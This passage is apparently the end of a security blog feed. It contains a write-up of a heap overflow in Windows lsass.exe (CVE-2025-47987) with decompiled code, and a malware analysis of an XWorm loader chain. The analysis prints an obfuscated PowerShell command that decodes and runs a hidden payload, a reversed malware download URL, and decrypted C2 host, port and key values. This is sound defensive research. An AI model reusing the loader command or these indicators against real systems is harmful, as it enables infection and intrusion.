class='line'>    v15 = v13 + 1;</div><div class='line'>    if ( !v14 && v15 &lt; v12 && !*v15 )</div><div class='line'>      break;   // Found double-null terminator =&gt; End of wide string</div><div class='line'>    v13 = v15 + 1;</div><div class='line'>    if ( v13 &gt;= v12 )</div><div class='line'>      return 0xC000000DLL;</div><div class='line'>  &#125;</div><div class='line'>  v16 = v5;</div><div class='line'>  v17 = (unsigned short *)TSAllocate(v5);</div><div class='line'>  v18 = v17;</div><div class='line'>  if ( v17 )</div><div class='line'>  &#123;</div><div class='line'>    memcpy_0(v17, v11, v16);</div><div class='line'>    *a4 = v18;</div><div class='line'>    return 0LL;</div><div class='line'>  &#125;</div><div class='line'>  return 0xC000009A;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1bm945n"><strong>Note</strong>: There are no restrictions on the length of the <strong>Data Area</strong> section!</p> <img src="buffer_format_csp.png" width="200"> <h3 id="triggering-the-bug" data-svelte-h="svelte-1iqvjrz"><a href="#triggering-the-bug">Triggering the bug</a></h3> <p data-svelte-h="svelte-1qfc8q4">The buffer format is finalized and passed to the vulnerable function <code>TSCreateKerbCertLogonBuffer</code>.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'>int64_t __fastcall TSCreateKerbCertLogonBuffer(</div><div class='line dim'>    struct UNICODE_STRING *password,</div><div class='line dim'>    struct UNICODE_STRING *domain,</div><div class='line dim'>    struct UNICODE_STRING *username,</div><div class='line dim'>    unsigned char *certData,</div><div class='line dim'>    size_t certLen,</div><div class='line dim'>    unsigned char **a6,</div><div class='line dim'>    unsigned int *a7)</div><div class='line dim'>&#123;</div><div class='line dim'>    unsigned int totalLength;</div><div class='line dim'>    unsigned int __totalLength;</div><div class='line dim'>    unsigned int _Size;</div><div class='line dim'>    ... // Other variables declaration</div><div class='line'></div><div class='line highlight'>    // Calculate total length (aligned)</div><div class='line highlight'>    totalLength = (domain-&gt;Length + password-&gt;Length + username-&gt;Length + 93) & 0xFFFFFFF8;</div><div class='line highlight'>    __totalLength = totalLength + certLen;</div><div class='line dim'>    _Size = certLen;</div><div class='line'></div><div class='line highlight'>    // Allocate memory</div><div class='line highlight'>    vulnBuf = TSAllocate(__totalLength);</div><div class='line dim'>    _vulnBuf = vulnBuf;</div><div class='line dim'>    if (!vulnBuf)</div><div class='line dim'>        return 0xC000009A;   // STATUS_INSUFFICIENT_RESOURCES</div><div class='line'></div><div class='line dim'>    // Fill in header</div><div class='line dim'>    *(DWORD *)vulnBuf = 13;</div><div class='line dim'>    currentPtr   = vulnBuf + 80;</div><div class='line dim'>    passwordBuf  = (void *)(vulnBuf + 80);</div><div class='line'></div><div class='line dim'>    // Password</div><div class='line dim'>    *(WORD *)(vulnBuf + 40) = password-&gt;Length;</div><div class='line dim'>    length = password-&gt;Length;</div><div class='line dim'>    *(QWORD *)(_vulnBuf + 48) = 80LL;</div><div class='line dim'>    *(WORD *)(_vulnBuf + 42) = length + 2;</div><div class='line dim'>    memcpy_0(passwordBuf, password-&gt;Buffer, password-&gt;Length);</div><div class='line'></div><div class='line dim'>    // Domain</div><div class='line dim'>    domainBuf = (char *)(*(unsigned short *)(_vulnBuf + 42) + currentPtr);</div><div class='line dim'>    *(WORD *)(_vulnBuf + 8) = domain-&gt;Length;</div><div class='line dim'>    *(WORD *)(_vulnBuf + 10) = domain-&gt;Length + 2;</div><div class='line dim'>    *(QWORD *)(_vulnBuf + 16) = &domainBuf[-_vulnBuf];</div><div class='line dim'>    memcpy_0(domainBuf, domain-&gt;Buffer, domain-&gt;Length);</div><div class='line'></div><div class='line dim'>    // Username</div><div class='line dim'>    usernameBuf = &domainBuf[*(unsigned short *)(_vulnBuf + 10)];</div><div class='line dim'>    *(WORD *)(_vulnBuf + 24) = username-&gt;Length;</div><div class='line dim'>    *(WORD *)(_vulnBuf + 26) = username-&gt;Length + 2;</div><div class='line dim'>    *(QWORD *)(_vulnBuf + 32) = &usernameBuf[-_vulnBuf];</div><div class='line dim'>    memcpy_0(usernameBuf, username-&gt;Buffer, username-&gt;Length);</div><div class='line'></div><div class='line dim'>    // Certificate</div><div class='line dim'>    certBuf = (char *)(</div><div class='line dim'>        (uint64_t)&usernameBuf[*(unsigned short *)(_vulnBuf + 26) + 7]</div><div class='line dim'>        & 0xFFFFFFFFFFFFFFF8ULL</div><div class='line dim'>    );</div><div class='line dim'>    *(DWORD *)(_vulnBuf + 60) = _Size;</div><div class='line dim'>    *(QWORD *)(_vulnBuf + 64) = &certBuf[-_vulnBuf];</div><div class='line highlight'>    memcpy_0(certBuf, certData, _Size); // Overflow occurs here</div><div class='line dim'>    ...</div><div class='line'></div><div class='line dim'>    return status;</div><div class='line dim'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1mkmhk2">The heap object size is calculated as the sum of the lengths of the <strong>username</strong>, <strong>domain</strong>, <strong>password</strong>, and <strong>certificate</strong>, plus a fixed overhead of <strong>93 bytes</strong>. Because the certificate length can be any 32-bit (DWORD) value, the total size calculation can overflow.</p> <p data-svelte-h="svelte-180vc6l">The resulting incorrect size is then used to allocate a heap object. When the code later copies the certificate bytes into this undersized buffer, an overflow occurs—approximately 4 GB of data is written past the end of the allocated chunk.</p> <p><picture><source srcset="/blog/_app/immutable/assets/overflow.B-Hy22_m.avif 736w" type="image/avif"> <img alt="/demystifying-CVE-2025-47987/overflow.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="/demystifying-CVE-2025-47987/overflow.png"></picture></p> <p data-svelte-h="svelte-svfwjm">This overwrites adjacent heap structures and accesses unmapped memory, leading to a crash of the privileged <code>lsass.exe</code> process.</p> <p data-svelte-h="svelte-174s55s"><a href="https://github.com/Kryptoenix/CVE-2025-47987_PoC/" rel="nofollow noopener noreferrer external" target="_blank">PoC code here (Win11 23H2)</a></p> <video controls src="poc.mp4" title="Title"></video> <h2 id="exploitation-ideas" data-svelte-h="svelte-1cilq0w"><a href="#exploitation-ideas">Exploitation Ideas</a></h2> <p data-svelte-h="svelte-18f0y70">Even though Microsoft classifies this CVE with an exploitability assessment of <strong><em>“Exploitation More Likely”</em></strong>, the crash caused by the overflow appears difficult to avoid because of the large number of bytes involved. It is theoretically possible that pointers could be overwritten before integrity checks are triggered, which might open a path to code execution that causes persistence across the forced reboot. However, modern security mitigations significantly reduce the likelihood of such a scenario. Therefore, the exploitation stage requires a better expertise in:</p> <ul data-svelte-h="svelte-1e9bq3x"><li><p>Windows heap internals</p> <ul><li>LFH, safe unlinking &amp; pointer decoding, guard pages, delayed free</li></ul></li> <li><p>Mitigations in user-mode on Windows 11</p> <ul><li>Heap isolation, pointer encoding, CFG, CET, MemGC</li></ul></li></ul> <h2 id="conclusion" data-svelte-h="svelte-kmpttn"><a href="#conclusion">Conclusion</a></h2> <p data-svelte-h="svelte-f4flx5">This concludes my analysis. Each piece of the puzzle has helped build a clearer picture of the vulnerability.  Hopefully, this sparks someone’s curiosity to dig deeper and perhaps even solve the exploitation mystery by crafting a working LPE proof-of-concept:). Either way, remember to stay curious and vigilant. Until next time — crash <code>lsass.exe</code>!</p> <h2 id="references" data-svelte-h="svelte-m6t0hm"><a href="#references">References</a></h2> <p data-svelte-h="svelte-wlk0jn"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987" rel="nofollow noopener noreferrer external" target="_blank">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987</a></p> <p data-svelte-h="svelte-1ap8ze5"><a href="https://ldapwiki.com/wiki/Wiki.jsp?page=Windows%20Client%20Authentication%20Architecture" rel="nofollow noopener noreferrer external" target="_blank">https://ldapwiki.com/wiki/Wiki.jsp?page=Windows%20Client%20Authentication%20Architecture</a></p> <p data-svelte-h="svelte-1a6gw2a"><a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general" rel="nofollow noopener noreferrer external" target="_blank">https://learn.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle–general</a></p>]]>
    </content>
    <category term="CVE-2025-47987" scheme="https://localhost:5173/blog/?tags=CVE-2025-47987" />
    <category term="Reverse Engineering" scheme="https://localhost:5173/blog/?tags=Reverse%20Engineering" />
    <category term="Windows" scheme="https://localhost:5173/blog/?tags=Windows" />
  </entry>
  <entry>
    <title type="html"><![CDATA[Hunting in the wild - XWorm new variant]]></title>
    <link href="https://localhost:5173/blog/blog/xworm-malware-analysis" />
    <id>https://localhost:5173/blog/blog/xworm-malware-analysis</id>
    <published>2024-02-17T00:00:00.000Z</published>
    <updated>2024-02-17T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="introduction" data-svelte-h="svelte-ccveyw"><a href="#introduction">Introduction</a></h2> <p data-svelte-h="svelte-l0ad4k">Hello there, welcome to the board! I’m openning this blog series with an exciting topic: malware analysis. I will start by collecting pieces for our puzzle and continue to combine them until, by the end of journey, each piece contributes to the bigger picture.</p> <p data-svelte-h="svelte-kka84p"><a href="https://bazaar.abuse.ch/" rel="nofollow noopener noreferrer external" target="_blank"><em>MalwareBazaar</em></a> website provides a large database of malware samples, where researchers can report different files which might seem suspicious. Today, while I was searching for potential subject for analysis, I stumbled upon an interesting archive. This was found as part of an email attachment in a malware campaign. The sample can be found <a href="https://bazaar.abuse.ch/sample/76fbfcb8754ba7e23c855a71db83aae75c106d84e106330b772cf3a28a440993/#comments" rel="nofollow noopener noreferrer external" target="_blank">here</a>.</p> <h2 id="first-sign-of-malicious-code" data-svelte-h="svelte-143uk5j"><a href="#first-sign-of-malicious-code">First sign of malicious code</a></h2> <p data-svelte-h="svelte-guxtjo">The initial archive contains a disk image <code>.img</code> file, a known format for executing code once the victim clicks the file. If this is not yet suspicious, let’s inspect for visible signs that might indicate unwanted behaviour such as download links. For this step, I used a powerful utiliy called <code>binwalk</code>, capable of extracting bundled files.</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" bash="true" title="extract files from disk image"><div class='code-title'>extract files from disk image</div><div class="language-id">bash</div><div class='code-container'><code><div class='line'>binwalk -e Damaged_item.img</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1h3vs2a">Now, a new folder <code>iso-root</code> contains a friendly-looking <code>VBS</code> script.</p> <p><img alt="damaged-itemvbs.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="damaged-itemvbs.png"></p> <p data-svelte-h="svelte-gqvjlb">The script simply tries to download the content found at a Pastebin link and then execute the fetched code using <code>ExecuteGlobal</code> function. Good news, the link was suspended and therefore, the following code cannot be executed anymore, preventing victims from infection. Defenders and Pastebin support did great work in such a short period of time (less than 18h :)). Fortunately, I was able to extract the next stage of <code>VBS</code> code (the code from Pastebin link) before removal. Let’s analyse it!</p> <p><img alt="fetched-vbs.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="fetched-vbs.png"></p> <p data-svelte-h="svelte-18du20p">We are dealing with some obfuscation, so it would be faster if we can find a way to print the final code (after deobfuscation, but before execution). This way, we can get a clear understanding of what’s under the hood. Some hints suggest that deobfuscated code is powershell. The plan is to write the final code to a powershell script.</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" vb="true" title="code appended to the end of obfuscated VBS"><div class='code-title'>code appended to the end of obfuscated VBS</div><div class="language-id">vb</div><div class='code-container'><code><div class='line'>Set fso = CreateObject("Scripting.FileSystemObject")</div><div class='line'>Set outputFile = fso.CreateTextFile("deobfuscated.ps1", True)</div><div class='line'>outputFile.WriteLine durguete</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-rqfhvz">Once we append this code and execute the whole script, <code>deobfuscated.ps1</code> file will help us in the next stage.</p> <h2 id="new-language-old-friend" data-svelte-h="svelte-1wjvziz"><a href="#new-language-old-friend">New language, old friend</a></h2> <p data-svelte-h="svelte-172y4m2">It becomes clear that attacker tries to hide as much as possible by adding polimorphic code, with many layers of obfuscation. The recovered <code>PS1</code> script replaces some substrings in <code>$codigo</code> variable, decodes it in <code>base64</code> and executes the code using a classic powershell technique.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" powershell="true"><div class="language-id">powershell</div><div class='code-container'><code><div class='line'>powershell -command "$codigo = 'ZgB1DgTreG4DgTreYwB0DgTreGkDgTrebw &lt;-- stripped --&gt; eKQB9DgTreCDgTreDgTrefQDgTre=';$oWjuxd = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( $codigo.replace('DgTre','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command $OWjuxD"</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-5hhyp2">After decoding, we are left with another powershell script. It is more verbose than the previous one.</p> <p><img alt="deobfs2.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="deobfs2.png"></p> <p data-svelte-h="svelte-nu44gi">Let’s break it into smaller pieces. The variable <code>@links</code>  contains links used by <code>DownloadDataFromLinks()</code> function to download an image (chosen at random). Now comes the interesting part. The actual downloaded image contain an embedded <code>.NET</code> assembly (<code>$loadedAssembly</code> and <code>GetMethod</code> are clear signs that we are dealing with .NET code). I will adapt this PS1 script such that, after downloading and decoding are complete, variable <code>$commandBytes</code> will write its content to an output file <code>malware-net</code>. Below is a small snippet of what’s being changed in the original code:</p> <p data-svelte-h="svelte-1y662yu">Additional decoding is required in order to extract the assembly properly. For that, <code>CyberChef</code> tool will simplify things a lot using this <a href="https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-16LE%2520(1200)')Find_/_Replace(%257B'option':'Regex','string':'%255C%255Cr%255C%255Cn'%257D,'%2520',true,false,true,false)From_Decimal('Space',false)" rel="nofollow noopener noreferrer external" target="_blank">recipe</a>.</p> <h2 id="decompiling-the-culprit" data-svelte-h="svelte-1akbftj"><a href="#decompiling-the-culprit">Decompiling the culprit</a></h2> <p data-svelte-h="svelte-12llahp">We take a look at the first bytes and notice that they represent the file signature for an executable <code>.EXE</code>. Inspect it’s properties to gain new insights.</p> <img src="malware.png" alt="Malware Image" width="500"> <p data-svelte-h="svelte-ma4w3b">Seems like this campaign is addressed to spanish speaking victims. Maybe it was sent to employees of some companies since the description is related to an <code>Automation project</code>?</p> <p data-svelte-h="svelte-1v50k1f">So far, the executable won’t pose dificulties because it’s written in an intepreted language, making it easier to retrieve the original code. <a href="https://github.com/icsharpcode/ILSpy0" rel="nofollow noopener noreferrer external" target="_blank"><em>ILSpy</em></a> is a great tool for decompiling .NET binaries, suitable for our purpose. (Open the image in a new tab if you don’t see the code)</p> <p><img alt="decompiled1.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="decompiled1.png"></p> <p data-svelte-h="svelte-23ztk8">This is one functionality of the binary through which the malware tries to gain persistence by abusing widely-known start-up registry <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>. Other functionalities found include: using D/Invoke syscall, creating new processes under the path of <code>cmd.exe</code> and another one related to .NET framework.</p> <p><img alt="malhelper.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="malhelper.png"></p> <p data-svelte-h="svelte-yzv1ld">Remember that in previously discussed powershell script, a method was invoked on this assembly, <code>VAI</code>:</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" powershell="true" title="snipped from second powershell script"><div class='code-title'>snipped from second powershell script</div><div class="language-id">powershell</div><div class='code-container'><code><div class='line'>$method = $type.GetMethod('VAI').Invoke($null, [object[]]('441ae23bb6fe-0269-74a4-c2ae-4ebc2dab=nekot&aidem=tla?txt.102061mrowxnhoj/o/moc.topsppa.64038-metsys-eciovni/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth', '1', 'C:ProgramData' , 'Name ',' AddInProcess32 ',' '))&#125; &#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-v92x8g">In ILSpy, we can see that <code>VAI</code> is responsible for reversing and downloading the file from link. After that, the file obtained is reversed and decoded in base64.</p> <p><img alt="toolsmal.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="toolsmal.png"></p> <h2 id="searching-for-keys" data-svelte-h="svelte-bjozqq"><a href="#searching-for-keys">Searching for keys?</a></h2> <p data-svelte-h="svelte-1nxiwqm">This hunting brought us to a new .NET binary. We can confirm its signature:</p> <!-- HTML_TAG_START --><pre class="shiki monokai" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line highlight'>$ file mal2.exe</div><div class='line dim'>mal2.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1dnjm7i">Through decompilation, we find a vast number of functions related to malitious behaviour. In <code>Main</code> function, some variables are decrypted using <code>AES</code> in <code>ECB mode</code>. These “setting” variables will be used later in establishing connections between victim and attacker’s C&amp;C infrastructure.</p> <p><img alt="worm1.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="worm1.png"></p> <p><img alt="worm2.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="worm2.png"></p> <p data-svelte-h="svelte-y5a8fg">Based on the known values of encrypted strings and encoded key, it is possible to recover the plaintext values using a similar decryption routine used in encryption:</p> <!-- HTML_TAG_START --><pre class="shiki monokai" csharp="true"><div class="language-id">csharp</div><div class='code-container'><code><div class='line'>using System;</div><div class='line'>using System.Security.Cryptography;</div><div class='line'>using System.Text;</div><div class='line'>public class Settings</div><div class='line'>&#123;</div><div class='line'>    public static string Host = "8wEbreuCNstcX+VMVrMtN79nabenssi23ZA2UwI0sBw=";</div><div class='line'>    public static string Port = "NHj6D/XmlURhrDZN4bCpqA==";</div><div class='line'>    public static string KEY = "tGwHQrFuqEZ9E5eQxvPElQ==";</div><div class='line'>    public static string SPL = "A6XU+/uh3DsQy74ojVhAhQ==";</div><div class='line'>    public static int Sleep = 3;</div><div class='line'>    public static string USBNM = "k6tUhyBB8c9OnCp0im2vjw==";</div><div class='line'>    public static string Mutex = "mrkh245537gVoEKF";</div><div class='line'>&#125;</div><div class='line'>public class AlgorithmAES</div><div class='line'>&#123;</div><div class='line'>    public static string Decrypt(string input)</div><div class='line'>    &#123;</div><div class='line'>        RijndaelManaged rijndaelManaged = new RijndaelManaged();</div><div class='line'>        MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();</div><div class='line'>        byte[] array = new byte[32];</div><div class='line'>        byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(UTF8SB(Settings.Mutex));</div><div class='line'>        Array.Copy(sourceArray, 0, array, 0, 16);</div><div class='line'>        Array.Copy(sourceArray, 0, array, 15, 16);</div><div class='line'>        rijndaelManaged.Key = array;</div><div class='line'>        rijndaelManaged.Mode = CipherMode.ECB;</div><div class='line'>        ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();</div><div class='line'>        byte[] array2 = Convert.FromBase64String(input);</div><div class='line'>        byte[] decryptedBytes = cryptoTransform.TransformFinalBlock(array2, 0, array2.Length);</div><div class='line'>        return UTF8BS(decryptedBytes);</div><div class='line'>    &#125;</div><div class='line'>    private static byte[] UTF8SB(string s)</div><div class='line'>    &#123;</div><div class='line'>        return Encoding.UTF8.GetBytes(s);</div><div class='line'>    &#125;</div><div class='line'>    private static string UTF8BS(byte[] b)</div><div class='line'>    &#123;</div><div class='line'>        return Encoding.UTF8.GetString(b);</div><div class='line'>    &#125;</div><div class='line'>&#125;</div><div class='line'>public class Main2</div><div class='line'>&#123;</div><div class='line'>    public static void Main()</div><div class='line'>    &#123;</div><div class='line'>        Settings.Host = AlgorithmAES.Decrypt(Settings.Host);</div><div class='line'>        Console.WriteLine("Decrypted Host: " + Settings.Host);</div><div class='line'>        Settings.Port = AlgorithmAES.Decrypt(Settings.Port);</div><div class='line'>        Console.WriteLine("Decrypted Port: " + Settings.Port);</div><div class='line'>        Settings.KEY = AlgorithmAES.Decrypt(Settings.KEY);</div><div class='line'>        Console.WriteLine("Decrypted KEY: " + Settings.KEY);</div><div class='line'>        Settings.SPL = AlgorithmAES.Decrypt(Settings.SPL);</div><div class='line'>        Console.WriteLine("Decrypted SPL: " + Settings.SPL);</div><div class='line'>        Settings.USBNM = AlgorithmAES.Decrypt(Settings.USBNM);</div><div class='line'>        Console.WriteLine("Decrypted USBNM: " + Settings.USBNM);</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-sv5aos">Finally, we can reveal the malware family used by threat actors:</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" txt="true" title="decrypted strings"><div class='code-title'>decrypted strings</div><div class="language-id">txt</div><div class='code-container'><code><div class='line dim'>Decrypted Host: xwv5group7001.duckdns.org</div><div class='line dim'>Decrypted Port: 7001</div><div class='line dim'>Decrypted KEY: &lt;123456789&gt;</div><div class='line highlight'>Decrypted SPL: &lt;Xwormmm&gt;</div><div class='line dim'>Decrypted USBNM: USB.exe</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-3hipc8">Taking a closer look at its functions in ILSpy, we find that it’s indeed <code>XWorm</code>. On internet, there is already a lot of research done on this malware. Even though, I will mention some of its capabilities: recording keystrokes, printscreens at specific interval of time and sending them to the attacker at random time (this jitter can be useful for bypassing network monitoring solutions). <code>Trellix</code> covered more rigorously this topic <a href="https://www.trellix.com/blogs/research/old-loader-new-threat-exploring-xworm/" rel="nofollow noopener noreferrer external" target="_blank">here</a>.</p> <h2 id="conclusion" data-svelte-h="svelte-kmpttn"><a href="#conclusion">Conclusion</a></h2> <p data-svelte-h="svelte-20trsz">The hunt is not over yet since we have valuable informations to work with. For instance, <code>xwv5group7001.duckdns.org</code> is a domain name registered by the attacker. It might provide additional information about his real identity, through OSINT techniques. Maybe the C2 infrastructured is poorly configured, leaving it vulnerable to attacks from defenders who are investigating this case. What about other clues left behind during this analysis process?</p> <p data-svelte-h="svelte-tpm7dn">Our jorney will end here for now, but it is worth investigating what hasn’t been covered in this post. Sometimes you end up finding interesting information:). Thank you for your undivided attention during this reading and don’t hesitate to contact me on social media for questions or feedback. Best wishes until next time!</p>]]>
    </content>
    <category term="Malware Analysis" scheme="https://localhost:5173/blog/?tags=Malware%20Analysis" />
    <category term="XWorm" scheme="https://localhost:5173/blog/?tags=XWorm" />
  </entry>
</feed>